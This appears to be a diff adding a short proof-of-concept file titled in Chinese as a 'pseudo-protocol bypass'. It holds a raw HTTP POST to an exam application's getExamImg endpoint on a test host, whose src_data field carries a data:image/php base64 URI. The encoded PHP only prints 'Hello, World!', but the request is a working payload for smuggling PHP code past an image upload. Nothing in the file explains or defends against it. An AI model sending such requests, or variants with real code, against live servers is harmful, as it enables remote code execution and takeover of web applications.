@@ -1,0 +1,11 @@
+# 伪协议绕过
+POST /index/Exam/getExamImg HTTP/1.1
+Host: www.xwd_test.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Connection: close
+Content-Length: 75
+
+src_data=data:image/php;base64,PD9waHAgcHJpbnQgIkhlbGxvLCBXb3JsZCEiOyA/Pg==
